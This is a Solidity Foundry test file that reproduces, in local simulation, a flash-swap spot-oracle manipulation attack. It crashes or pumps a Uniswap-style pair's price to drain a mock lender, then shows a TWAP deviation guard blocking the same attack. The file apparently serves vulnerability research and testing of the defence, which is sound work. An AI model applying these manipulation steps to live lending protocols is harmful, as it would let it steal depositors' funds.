// SPDX-License-Identifier: MIT
// END-TO-END oracle-manipulation repro for the flagged
// "oracle-manipulation +probe(oracle-spot)" signals.
//
// Test 1: borrow at the honest spot, dump the collateral token to crash the
//         reserve ratio -> the loan turns into bad debt (the "trigger bad
//         liquidations" leg of the attack).
// Test 2: the full atomic flash-swap attack (OracleAttackRepro) against
//         SpotLender — flash -> pump -> borrow -> restore -> repay — and
//         assert positive profit in ONE transaction.
// Test 3: the identical setup on TwapGuardLender (30-min TWAP + 5% spot
//         deviation guard) — honest borrows work, the manipulation reverts.
//
// LOCAL SIMULATION ONLY. Nothing here touches a live chain.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {ERC20Mintable} from "../src/tokens/ERC20Mintable.sol";
import {UniswapV2PairLocal} from "../src/uniswap/UniswapV2PairLocal.sol";
import {SpotLender, TwapGuardLender} from "../src/OracleTargets.sol";
import {OracleAttackRepro} from "../src/attackers/OracleAttackRepro.sol";

contract OracleSpotManipulationRepro is Test {
    ERC20Mintable collateral;
    ERC20Mintable cash;
    UniswapV2PairLocal poolA; // oracle pair (COL/CASH) the lenders read
    UniswapV2PairLocal poolB; // untouched flash-loan source
    SpotLender spotLender;
    TwapGuardLender twapLender;
    OracleAttackRepro attackerContract;

    address attacker;

    uint256 constant POOL = 1_000_000e18;          // reserves per side, honest 1:1
    uint256 constant FLASH = 500_000e18;           // 50% of poolA reserves
    uint256 constant ATTACKER_COLL = 100_000e18;   // attacker's own capital

    function setUp() public {
        attacker = makeAddr("attacker");

        collateral = new ERC20Mintable("Collateral", "COL");
        cash = new ERC20Mintable("Cash", "CASH");

        poolA = new UniswapV2PairLocal(address(collateral), address(cash));
        poolB = new UniswapV2PairLocal(address(collateral), address(cash));

        collateral.mint(address(this), 2 * POOL);
        cash.mint(address(this), 2 * POOL);
        collateral.approve(address(poolA), type(uint256).max);
        cash.approve(address(poolA), type(uint256).max);
        collateral.approve(address(poolB), type(uint256).max);
        cash.approve(address(poolB), type(uint256).max);
        poolA.addLiquidity(POOL, POOL);
        poolB.addLiquidity(POOL, POOL);

        spotLender = new SpotLender(address(collateral), address(cash), address(poolA));
        twapLender = new TwapGuardLender(address(collateral), address(cash), address(poolA));
        cash.mint(address(spotLender), POOL); // lendable float
        cash.mint(address(twapLender), POOL);

        attackerContract = new OracleAttackRepro(
            address(collateral), address(cash),
            address(poolA), address(poolB),
            spotLender, FLASH
        );
        collateral.mint(address(attackerContract), ATTACKER_COLL);

        vm.startPrank(attacker);
        collateral.approve(address(spotLender), type(uint256).max);
        collateral.approve(address(twapLender), type(uint256).max);
        vm.stopPrank();
        collateral.mint(attacker, ATTACKER_COLL); // attacker EOA's own capital
    }

    // ------------------------------------------------------------------
    // 1) Borrow at the honest spot, crash it, walk away -> bad debt.
    // ------------------------------------------------------------------
    function test_dump_creates_bad_debt_on_spot_lender() public {
        vm.prank(attacker);
        spotLender.depositCollateral(ATTACKER_COLL);
        vm.prank(attacker);
        spotLender.borrow(ATTACKER_COLL); // full value at honest 1:1

        // "Flash-borrowed" inventory: dump 500k COL into the oracle pair.
        collateral.mint(attacker, FLASH);
        vm.startPrank(attacker);
        collateral.transfer(address(poolA), FLASH);
        (uint112 r0, uint112 r1, ) = poolA.getReserves();
        uint256 inFee = FLASH * 997;
        uint256 out = inFee * r1 / (r0 * 1000 + inFee);
        poolA.swap(0, out, attacker, new bytes(0));
        vm.stopPrank();

        (uint112 a0, uint112 a1, ) = poolA.getReserves();
        uint256 crashed = (uint256(a1) * 1e18) / uint256(a0);
        uint256 collValue = ATTACKER_COLL * crashed / 1e18;
        uint256 badDebt = ATTACKER_COLL - collValue;

        console2.log("crashed spot (1e18):", crashed);
        console2.log("bad debt (CASH wei):", badDebt);

        assertLt(crashed, 0.5e18, "spot should crash >50%");
        assertLt(collValue, ATTACKER_COLL, "loan should be undercollateralized");
        assertGt(badDebt, 50_000e18, "bad debt should exceed half the loan");
    }

    // ------------------------------------------------------------------
    // 2) The full atomic flash-swap attack on the spot-oracle lender.
    // ------------------------------------------------------------------
    function test_flash_swap_attack_drains_spot_lender() public {
        uint256 before = cash.balanceOf(address(this));
        attackerContract.attack(); // owner == this test contract
        uint256 profit = cash.balanceOf(address(this)) - before;

        console2.log("attacker profit (CASH wei):", profit);
        console2.log("spotLender float drained to:", cash.balanceOf(address(spotLender)));

        assertGt(profit, 0, "attack must be profitable on SpotLender");
        assertLt(cash.balanceOf(address(spotLender)), POOL, "lender must lose funds");
    }

    // ------------------------------------------------------------------
    // 3a) TWAP guard: honest borrow after the 30-min window succeeds.
    // ------------------------------------------------------------------
    function test_twap_guard_allows_honest_borrow() public {
        vm.warp(block.timestamp + 31 minutes);
        vm.prank(attacker);
        twapLender.depositCollateral(ATTACKER_COLL);
        vm.prank(attacker);
        twapLender.borrow(ATTACKER_COLL);
        assertEq(cash.balanceOf(attacker), ATTACKER_COLL, "honest borrow should succeed");
        assertEq(twapLender.lastTwapPrice(), 1e18, "TWAP should equal honest price");
    }

    // ------------------------------------------------------------------
    // 3b) TWAP guard: the same dump no longer enables the exploit.
    // ------------------------------------------------------------------
    function test_twap_guard_blocks_dump() public {
        vm.warp(block.timestamp + 31 minutes);
        vm.prank(attacker);
        twapLender.depositCollateral(ATTACKER_COLL);

        // Crash the spot AFTER depositing (window is valid, TWAP is honest).
        collateral.mint(attacker, FLASH);
        vm.startPrank(attacker);
        collateral.transfer(address(poolA), FLASH);
        (uint112 r0, uint112 r1, ) = poolA.getReserves();
        uint256 inFee = FLASH * 997;
        uint256 out = inFee * r1 / (r0 * 1000 + inFee);
        poolA.swap(0, out, attacker, new bytes(0));

        // Borrow now reverts: spot deviates ~55% from the 30-min TWAP.
        vm.expectRevert(bytes("price deviation too high"));
        twapLender.borrow(ATTACKER_COLL);
        vm.stopPrank();

        assertEq(cash.balanceOf(address(twapLender)), POOL, "guard must keep the float intact");
    }
}
